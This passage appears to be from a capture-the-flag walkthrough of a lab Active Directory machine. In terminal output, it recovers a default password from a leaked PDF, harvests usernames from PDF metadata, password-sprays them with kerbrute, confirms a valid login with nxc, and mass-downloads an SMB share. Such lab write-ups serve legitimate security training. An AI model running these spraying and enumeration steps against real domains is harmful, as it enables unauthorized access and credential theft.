2020-09-02-upload.txt:13:consectetur quisquam labore quiquia. Ut tempora ut sed dolore etincidunt ipsum. Porro porro sit numquam sed porro. Aliquam modi dolorem amet sit amet
2020-09-04-upload.txt:5:est. Ipsum quiquia etincidunt quiquia. Quisquam non quisquam dolore adipisci consectetur eius. Voluptatem aliquam quisquam quaerat dolorem tempora.
2020-09-04-upload.txt:6:Dolorem voluptatem non numquam eius ipsum tempora ut.
2020-09-04-upload.txt:7:Sed sit magnam porro sit. Dolore modi adipisci quaerat dolorem tempora est
2020-09-04-upload.txt:13:Quaerat magnam non quaerat dolore etincidunt. Quaerat dolor eius voluptatem. Ipsum eius neque est. Ipsum magnam tempora ipsum voluptatem porro
2020-09-05-upload.txt:9:aliquam quisquam. Quisquam tempora quaerat consectetur aliquam sed ut eius.
2020-09-06-upload.txt:2:Modi tempora tempora labore etincidunt neque numquam sed. Quaerat eius
2020-09-13-upload.txt:4:aliquam amet porro. Tempora aliquam dolorem labore quaerat quaerat dolorem
2020-09-13-upload.txt:7:Eius amet neque velit porro velit tempora. Quaerat dolorem eius neque ipsum
2020-09-13-upload.txt:8:dolore ut quaerat. Consectetur quisquam labore voluptatem ut dolor. Tempora tempora ut est eius etincidunt. Non dolorem consectetur neque etincidunt
2020-09-16-upload.txt:2:Aliquam tempora porro numquam quaerat. Sit quiquia porro magnam neque
2020-09-16-upload.txt:5:velit. Ipsum eius labore aliquam sit quaerat tempora. Adipisci est porro ipsum
2020-09-16-upload.txt:9:tempora. Quisquam sit etincidunt sed quiquia. Quisquam quaerat dolorem
2020-09-16-upload.txt:11:aliquam voluptatem dolore. Tempora sit ipsum adipisci. Consectetur ut non
2020-09-27-upload.txt:4:Amet est labore ut velit aliquam. Numquam consectetur tempora sit quiquia.
2020-09-27-upload.txt:5:Tempora quaerat ipsum sed. Non quisquam adipisci neque sed adipisci velit.
2020-09-27-upload.txt:11:modi tempora quisquam non amet. Dolorem non consectetur sed. Consectetur numquam eius dolor. Aliquam aliquam tempora sed non. Modi dolorem
2020-10-05-upload.txt:1:Etincidunt neque tempora porro.
2020-10-19-upload.txt:2:Amet dolorem neque non ut. Numquam labore tempora non ipsum quisquam
2020-10-19-upload.txt:3:tempora. Numquam labore etincidunt eius magnam numquam aliquam. Sed
2020-10-19-upload.txt:4:velit quaerat etincidunt. Tempora est modi modi voluptatem dolore. Magnam
2020-10-19-upload.txt:6:quisquam. Etincidunt tempora numquam ut velit. Voluptatem quiquia eius
2020-10-19-upload.txt:9:dolorem adipisci labore neque ut. Aliquam velit est eius etincidunt tempora.
2020-10-19-upload.txt:10:Neque tempora amet ipsum non consectetur quiquia porro. Consectetur aliquam modi est numquam.
2020-11-01-upload.txt:2:Etincidunt sed aliquam ipsum. Aliquam neque tempora dolore amet tempora
2020-11-01-upload.txt:8:consectetur dolore ipsum. Tempora sit dolor dolore est. Numquam velit labore
2020-11-03-upload.txt:2:Aliquam etincidunt etincidunt est neque. Numquam consectetur tempora ipsum labore. Velit dolorem consectetur est. Etincidunt aliquam adipisci labore
2020-11-03-upload.txt:3:adipisci tempora. Labore voluptatem sit sit etincidunt etincidunt quisquam labore. Dolor etincidunt tempora neque quisquam sed. Est ipsum aliquam ipsum
2020-11-03-upload.txt:4:dolorem porro dolore quisquam. Voluptatem velit dolorem tempora. Dolorem
2020-11-10-upload.txt:3:sed tempora porro voluptatem adipisci quisquam. Quiquia amet voluptatem
2020-11-11-upload.txt:2:Non dolor labore adipisci quaerat numquam velit dolore. Dolore velit voluptatem velit adipisci sit tempora quisquam. Dolorem eius dolorem sed porro.
2020-11-11-upload.txt:3:Aliquam voluptatem consectetur neque velit. Neque tempora dolorem voluptatem ut. Sit sed voluptatem tempora. Porro magnam labore velit dolor dolore
2020-11-11-upload.txt:4:amet tempora. Consectetur tempora amet quisquam.
2020-11-11-upload.txt:5:Numquam sit quaerat eius magnam quiquia. Consectetur tempora dolorem sit
2020-11-11-upload.txt:6:ipsum sit tempora quisquam. Ipsum labore velit labore dolore dolor sed. Adipisci tempora voluptatem amet consectetur magnam consectetur. Labore labore
2020-11-30-upload.txt:3:quaerat. Etincidunt ut est tempora adipisci ut adipisci. Ut quisquam dolorem
2020-11-30-upload.txt:6:Porro amet quiquia consectetur. Porro quiquia ipsum non dolore aliquam dolorem. Dolorem ut quaerat magnam est sed. Quiquia ipsum porro dolore voluptatem. Tempora sit eius ut numquam eius. Aliquam modi velit neque quaerat.
2020-11-30-upload.txt:7:Magnam non ut tempora. Neque labore dolor ut ipsum quaerat quisquam sed.
2020-12-10-upload.txt:3:Voluptatem velit modi porro. Est est sed neque est quiquia. Sit adipisci adipisci dolorem tempora. Dolorem consectetur velit numquam. Sed consectetur ut
2020-12-10-upload.txt:4:aliquam quisquam adipisci magnam est. Tempora eius dolore sed amet non.
2020-12-10-upload.txt:7:est. Aliquam dolore tempora sed consectetur sit. Sit sed quiquia velit modi
2020-12-15-upload.txt:5:sed adipisci adipisci. Quaerat tempora amet tempora quiquia non.
2020-12-15-upload.txt:9:magnam. Aliquam adipisci magnam labore etincidunt. Tempora consectetur
2020-12-15-upload.txt:12:ipsum consectetur. Ut est eius aliquam eius modi tempora labore. Non quiquia
2020-12-24-upload.txt:1:Ut voluptatem tempora quaerat.
2020-12-24-upload.txt:2:Velit etincidunt dolorem neque magnam quaerat. Dolore voluptatem tempora
2020-12-24-upload.txt:4:quisquam dolorem. Magnam sed quaerat sit est. Quaerat amet quaerat consectetur adipisci tempora sed. Aliquam amet modi dolor sed. Adipisci aliquam
2020-12-24-upload.txt:9:Tempora consectetur modi quisquam adipisci. Aliquam dolore amet velit porro
```

```bash
2020-06-04-upload.txt:3:Please login using your username and the default password of:
2020-06-04-upload.txt:5:After logging in please change your password as soon as possible.
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence/PDF]
└─$ cat 2020-06-04-upload.txt
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence/Users]
└─$ vim passwd
┌──(kali㉿kali)-[~/Work/Kali/Intelligence/Users]
└─$ cat passwd
NewIntelligenceCorpUser9876
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence/PDF]
└─$ for f in *.pdf; do pdfinfo "$f" 2>/dev/null | grep -i '^Creator:'; done | sed 's/^Creator:[[:space:]]*//' | sort -u
Anita.Roberts
Brian.Baker
Brian.Morris
Daniel.Shelton
Danny.Matthews
Darryl.Harris
David.Mcbride
David.Reed
David.Wilson
Ian.Duncan
Jason.Patterson
Jason.Wright
Jennifer.Thomas
Jessica.Moody
John.Coleman
Jose.Williams
Kaitlyn.Zimmerman
Kelly.Long
Nicole.Brock
Richard.Williams
Samuel.Richardson
Scott.Scott
Stephanie.Young
Teresa.Williamson
Thomas.Hall
Thomas.Valenzuela
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee
┌──(kali㉿kali)-[~/Work/Kali/Intelligence/PDF]
└─$ for f in *.pdf; do pdfinfo "$f" 2>/dev/null | grep -i '^Creator:'; done | sed 's/^Creator:[[:space:]]*//' | sort -u  | sort -u > ../Users/users
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence]
└─$ ./kerbrute_linux_amd64 passwordspray -d intelligence.htb --dc 10.129.95.154 Users/users 'NewIntelligenceCorpUser9876'

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 08/24/26 - Ronnie Flathers @ropnop

2026/08/24 23:29:12 >  Using KDC(s):
2026/08/24 23:29:12 >  	10.129.95.154:88

2026/08/24 23:29:12 >  [+] VALID LOGIN WITH ERROR:	 Tiffany.Molina@intelligence.htb:NewIntelligenceCorpUser9876	 (Clock skew is too great)
2026/08/24 23:29:12 >  Done! Tested 30 logins (1 successes) in 0.834 secondsnxc
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence]
└─$ vim Users/tiffany
┌──(kali㉿kali)-[~/Work/Kali/Intelligence]
└─$ cat Users/tiffany
Tiffany.Molina:NewIntelligenceCorpUser9876
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence]
└─$ nxc smb intelligence.htb -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876'
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
┌──(kali㉿kali)-[~/Work/Kali/Intelligence]
└─$ nxc winrm intelligence.htb -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876'
WINRM       10.129.95.154   5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.95.154   5985   DC               [-] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
┌──(kali㉿kali)-[~/Work/Kali/Intelligence]
└─$ nxc ldap intelligence.htb -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876'
LDAP        10.129.95.154   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.95.154   389    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence]
└─$ nxc smb intelligence.htb -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' --shares
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
SMB         10.129.95.154   445    DC               [*] Enumerated shares
SMB         10.129.95.154   445    DC               Share           Permissions     Remark
SMB         10.129.95.154   445    DC               -----           -----------     ------
SMB         10.129.95.154   445    DC               ADMIN$                          Remote Admin
SMB         10.129.95.154   445    DC               C$                              Default share
SMB         10.129.95.154   445    DC               IPC$            READ            Remote IPC
SMB         10.129.95.154   445    DC               IT              READ
SMB         10.129.95.154   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share
SMB         10.129.95.154   445    DC               Users           READ
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence/SMB]
└─$ smbclient //intelligence.htb/Users -U 'Tiffany.Molina%NewIntelligenceCorpUser9876'
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \desktop.ini of size 174 as desktop.ini (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \Administrator\*
NT_STATUS_STOPPED_ON_SYMLINK listing \All Users\*
getting file \Default\NTUSER.DAT of size 65536 as Default/NTUSER.DAT (107.9 KiloBytes/sec) (average 62.0 KiloBytes/sec)
getting file \Default\NTUSER.DAT.LOG1 of size 65536 as Default/NTUSER.DAT.LOG1 (143.2 KiloBytes/sec) (average 86.5 KiloBytes/sec)
getting file \Default\NTUSER.DAT.LOG2 of size 49152 as Default/NTUSER.DAT.LOG2 (108.6 KiloBytes/sec) (average 91.6 KiloBytes/sec)
getting file \Default\NTUSER.DAT{0d4799bb-b8b5-11e8-ac1a-e41d2d717380}.TM.blf of size 65536 as Default/NTUSER.DAT{0d4799bb-b8b5-11e8-ac1a-e41d2d717380}.TM.blf (142.9 KiloBytes/sec) (average 101.3 KiloBytes/sec)
getting file \Default\NTUSER.DAT{0d4799bb-b8b5-11e8-ac1a-e41d2d717380}.TMContainer00000000000000000001.regtrans-ms of size 524288 as Default/NTUSER.DAT{0d4799bb-b8b5-11e8-ac1a-e41d2d717380}.TMContainer00000000000000000001.regtrans-ms (238.9 KiloBytes/sec) (average 166.6 KiloBytes/sec)
getting file \Default\NTUSER.DAT{0d4799bb-b8b5-11e8-ac1a-e41d2d717380}.TMContainer00000000000000000002.regtrans-ms of size 524288 as Default/NTUSER.DAT{0d4799bb-b8b5-11e8-ac1a-e41d2d717380}.TMContainer00000000000000000002.regtrans-ms (259.5 KiloBytes/sec) (average 194.8 KiloBytes/sec)
getting file \Default\NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf of size 65536 as Default/NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf (143.5 KiloBytes/sec) (average 191.5 KiloBytes/sec)
getting file \Default\NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms of size 524288 as Default/NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms (424.2 KiloBytes/sec) (average 226.0 KiloBytes/sec)
getting file \Default\NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms of size 524288 as Default/NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms (466.7 KiloBytes/sec) (average 254.6 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \Default User\*
NT_STATUS_ACCESS_DENIED listing \Public\*
NT_STATUS_ACCESS_DENIED listing \Ted.Graves\*
getting file \Tiffany.Molina\NTUSER.DAT of size 131072 as Tiffany.Molina/NTUSER.DAT (231.9 KiloBytes/sec) (average 253.3 KiloBytes/sec)
getting file \Tiffany.Molina\ntuser.dat.LOG1 of size 86016 as Tiffany.Molina/ntuser.dat.LOG1 (185.8 KiloBytes/sec) (average 250.4 KiloBytes/sec)
getting file \Tiffany.Molina\ntuser.dat.LOG2 of size 0 as Tiffany.Molina/ntuser.dat.LOG2 (0.0 KiloBytes/sec) (average 242.6 KiloBytes/sec)
getting file \Tiffany.Molina\NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf of size 65536 as Tiffany.Molina/NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf (141.9 KiloBytes/sec) (average 238.5 KiloBytes/sec)
getting file \Tiffany.Molina\NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms of size 524288 as Tiffany.Molina/NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms (516.1 KiloBytes/sec) (average 261.4 KiloBytes/sec)
getting file \Tiffany.Molina\NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms of size 524288 as Tiffany.Molina/NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms (423.5 KiloBytes/sec) (average 276.2 KiloBytes/sec)
getting file \Tiffany.Molina\ntuser.ini of size 20 as Tiffany.Molina/ntuser.ini (0.0 KiloBytes/sec) (average 267.5 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \Default\Application Data\*
NT_STATUS_ACCESS_DENIED listing \Default\Cookies\*
NT_STATUS_ACCESS_DENIED listing \Default\Local Settings\*
NT_STATUS_ACCESS_DENIED listing \Default\My Documents\*
NT_STATUS_ACCESS_DENIED listing \Default\NetHood\*
NT_STATUS_ACCESS_DENIED listing \Default\Recent\*
NT_STATUS_ACCESS_DENIED listing \Default\SendTo\*
NT_STATUS_ACCESS_DENIED listing \Default\Start Menu\*
NT_STATUS_ACCESS_DENIED listing \Default\Templates\*
NT_STATUS_ACCESS_DENIED listing \Tiffany.Molina\Application Data\*
NT_STATUS_ACCESS_DENIED listing \Tiffany.Molina\Cookies\*
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as Tiffany.Molina/Desktop/user.txt (0.1 KiloBytes/sec) (average 259.2 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \Tiffany.Molina\Local Settings\*
NT_STATUS_ACCESS_DENIED listing \Tiffany.Molina\My Documents\*
NT_STATUS_ACCESS_DENIED listing \Tiffany.Molina\NetHood\*
NT_STATUS_ACCESS_DENIED listing \Tiffany.Molina\Recent\*
NT_STATUS_ACCESS_DENIED listing \Tiffany.Molina\SendTo\*
NT_STATUS_ACCESS_DENIED listing \Tiffany.Molina\Start Menu\*
NT_STATUS_ACCESS_DENIED listing \Tiffany.Molina\Templates\*
NT_STATUS_ACCESS_DENIED listing \Default\Documents\My Music\*
NT_STATUS_ACCESS_DENIED listing \Default\Documents\My Pictures\*
NT_STATUS_ACCESS_DENIED listing \Default\Documents\My Videos\*
NT_STATUS_ACCESS_DENIED listing \Tiffany.Molina\Documents\My Music\*
NT_STATUS_ACCESS_DENIED listing \Tiffany.Molina\Documents\My Pictures\*
NT_STATUS_ACCESS_DENIED listing \Tiffany.Molina\Documents\My Videos\*
NT_STATUS_ACCESS_DENIED listing \Default\AppData\Local\Application Data\*
NT_STATUS_ACCESS_DENIED listing \Default\AppData\Local\History\*
NT_STATUS_ACCESS_DENIED listing \Default\AppData\Local\Temporary Internet Files\*
NT_STATUS_ACCESS_DENIED listing \Tiffany.Molina\AppData\Local\Application Data\*
NT_STATUS_ACCESS_DENIED listing \Tiffany.Molina\AppData\Local\History\*
NT_STATUS_ACCESS_DENIED listing \Tiffany.Molina\AppData\Local\Temporary Internet Files\*
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\UsrClass.dat of size 8192 as Tiffany.Molina/AppData/Local/Microsoft/Windows/UsrClass.dat (18.4 KiloBytes/sec) (average 252.0 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\UsrClass.dat.LOG1 of size 8192 as Tiffany.Molina/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG1 (18.3 KiloBytes/sec) (average 245.2 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\UsrClass.dat.LOG2 of size 8192 as Tiffany.Molina/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG2 (18.4 KiloBytes/sec) (average 238.8 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\UsrClass.dat{21166fb4-a0a8-11eb-ae74-000c2908ad93}.TM.blf of size 65536 as Tiffany.Molina/AppData/Local/Microsoft/Windows/UsrClass.dat{21166fb4-a0a8-11eb-ae74-000c2908ad93}.TM.blf (117.2 KiloBytes/sec) (average 234.7 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\UsrClass.dat{21166fb4-a0a8-11eb-ae74-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms of size 524288 as Tiffany.Molina/AppData/Local/Microsoft/Windows/UsrClass.dat{21166fb4-a0a8-11eb-ae74-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms (390.2 KiloBytes/sec) (average 246.5 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\UsrClass.dat{21166fb4-a0a8-11eb-ae74-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms of size 524288 as Tiffany.Molina/AppData/Local/Microsoft/Windows/UsrClass.dat{21166fb4-a0a8-11eb-ae74-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms (426.3 KiloBytes/sec) (average 258.2 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \Default\AppData\Local\Microsoft\Windows\Temporary Internet Files\*
getting file \Default\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\desktop.ini of size 148 as Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/desktop.ini (0.3 KiloBytes/sec) (average 252.3 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk of size 352 as Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Shows Desktop.lnk (0.8 KiloBytes/sec) (average 246.6 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Window Switcher.lnk of size 334 as Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Window Switcher.lnk (0.8 KiloBytes/sec) (average 241.3 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \Tiffany.Molina\AppData\Local\Microsoft\Windows\Temporary Internet Files\*
getting file \Tiffany.Molina\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\desktop.ini of size 148 as Tiffany.Molina/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/desktop.ini (0.3 KiloBytes/sec) (average 236.1 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk of size 352 as Tiffany.Molina/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Shows Desktop.lnk (0.8 KiloBytes/sec) (average 231.2 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Window Switcher.lnk of size 334 as Tiffany.Molina/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Window Switcher.lnk (0.8 KiloBytes/sec) (average 226.4 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group1\1 - Desktop.lnk of size 1109 as Default/AppData/Local/Microsoft/Windows/WinX/Group1/1 - Desktop.lnk (2.5 KiloBytes/sec) (average 221.9 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group1\desktop.ini of size 75 as Default/AppData/Local/Microsoft/Windows/WinX/Group1/desktop.ini (0.2 KiloBytes/sec) (average 217.5 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group2\1 - Run.lnk of size 1109 as Default/AppData/Local/Microsoft/Windows/WinX/Group2/1 - Run.lnk (2.5 KiloBytes/sec) (average 213.3 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group2\2 - Search.lnk of size 1109 as Default/AppData/Local/Microsoft/Windows/WinX/Group2/2 - Search.lnk (2.5 KiloBytes/sec) (average 209.3 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group2\3 - Windows Explorer.lnk of size 1109 as Default/AppData/Local/Microsoft/Windows/WinX/Group2/3 - Windows Explorer.lnk (2.5 KiloBytes/sec) (average 205.4 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group2\4 - Control Panel.lnk of size 1492 as Default/AppData/Local/Microsoft/Windows/WinX/Group2/4 - Control Panel.lnk (3.3 KiloBytes/sec) (average 201.7 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group2\5 - Task Manager.lnk of size 1021 as Default/AppData/Local/Microsoft/Windows/WinX/Group2/5 - Task Manager.lnk (2.3 KiloBytes/sec) (average 198.1 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group2\desktop.ini of size 325 as Default/AppData/Local/Microsoft/Windows/WinX/Group2/desktop.ini (0.7 KiloBytes/sec) (average 194.7 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group3\01 - Command Prompt.lnk of size 1015 as Default/AppData/Local/Microsoft/Windows/WinX/Group3/01 - Command Prompt.lnk (2.3 KiloBytes/sec) (average 191.3 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group3\01a - Windows PowerShell.lnk of size 1127 as Default/AppData/Local/Microsoft/Windows/WinX/Group3/01a - Windows PowerShell.lnk (2.5 KiloBytes/sec) (average 188.1 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group3\02 - Command Prompt.lnk of size 1059 as Default/AppData/Local/Microsoft/Windows/WinX/Group3/02 - Command Prompt.lnk (2.4 KiloBytes/sec) (average 185.0 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group3\02a - Windows PowerShell.lnk of size 1171 as Default/AppData/Local/Microsoft/Windows/WinX/Group3/02a - Windows PowerShell.lnk (2.6 KiloBytes/sec) (average 181.9 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group3\03 - Computer Management.lnk of size 1015 as Default/AppData/Local/Microsoft/Windows/WinX/Group3/03 - Computer Management.lnk (2.3 KiloBytes/sec) (average 179.0 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group3\04 - Disk Management.lnk of size 1015 as Default/AppData/Local/Microsoft/Windows/WinX/Group3/04 - Disk Management.lnk (2.3 KiloBytes/sec) (average 176.2 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group3\04-1 - NetworkStatus.lnk of size 1582 as Default/AppData/Local/Microsoft/Windows/WinX/Group3/04-1 - NetworkStatus.lnk (3.6 KiloBytes/sec) (average 173.5 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group3\05 - Device Manager.lnk of size 1075 as Default/AppData/Local/Microsoft/Windows/WinX/Group3/05 - Device Manager.lnk (2.4 KiloBytes/sec) (average 170.8 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group3\06 - SystemAbout.lnk of size 1576 as Default/AppData/Local/Microsoft/Windows/WinX/Group3/06 - SystemAbout.lnk (3.5 KiloBytes/sec) (average 168.3 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group3\07 - Event Viewer.lnk of size 1015 as Default/AppData/Local/Microsoft/Windows/WinX/Group3/07 - Event Viewer.lnk (2.3 KiloBytes/sec) (average 165.8 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group3\08 - PowerAndSleep.lnk of size 1578 as Default/AppData/Local/Microsoft/Windows/WinX/Group3/08 - PowerAndSleep.lnk (3.5 KiloBytes/sec) (average 163.4 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group3\09 - Mobility Center.lnk of size 1015 as Default/AppData/Local/Microsoft/Windows/WinX/Group3/09 - Mobility Center.lnk (1.3 KiloBytes/sec) (average 159.3 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group3\10 - AppsAndFeatures.lnk of size 1578 as Default/AppData/Local/Microsoft/Windows/WinX/Group3/10 - AppsAndFeatures.lnk (3.5 KiloBytes/sec) (average 157.1 KiloBytes/sec)
getting file \Default\AppData\Local\Microsoft\Windows\WinX\Group3\desktop.ini of size 941 as Default/AppData/Local/Microsoft/Windows/WinX/Group3/desktop.ini (2.1 KiloBytes/sec) (average 154.9 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group1\1 - Desktop.lnk of size 1109 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group1/1 - Desktop.lnk (2.5 KiloBytes/sec) (average 152.8 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group1\desktop.ini of size 75 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group1/desktop.ini (0.2 KiloBytes/sec) (average 150.7 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group2\1 - Run.lnk of size 1109 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group2/1 - Run.lnk (2.5 KiloBytes/sec) (average 148.7 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group2\2 - Search.lnk of size 1109 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group2/2 - Search.lnk (2.5 KiloBytes/sec) (average 146.8 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group2\3 - Windows Explorer.lnk of size 1109 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group2/3 - Windows Explorer.lnk (1.0 KiloBytes/sec) (average 142.2 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group2\4 - Control Panel.lnk of size 1492 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group2/4 - Control Panel.lnk (3.3 KiloBytes/sec) (average 140.4 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group2\5 - Task Manager.lnk of size 1021 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group2/5 - Task Manager.lnk (2.3 KiloBytes/sec) (average 138.7 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group2\desktop.ini of size 325 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group2/desktop.ini (0.7 KiloBytes/sec) (average 137.0 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group3\01 - Command Prompt.lnk of size 1015 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/01 - Command Prompt.lnk (2.3 KiloBytes/sec) (average 135.3 KiloBytes/sec)
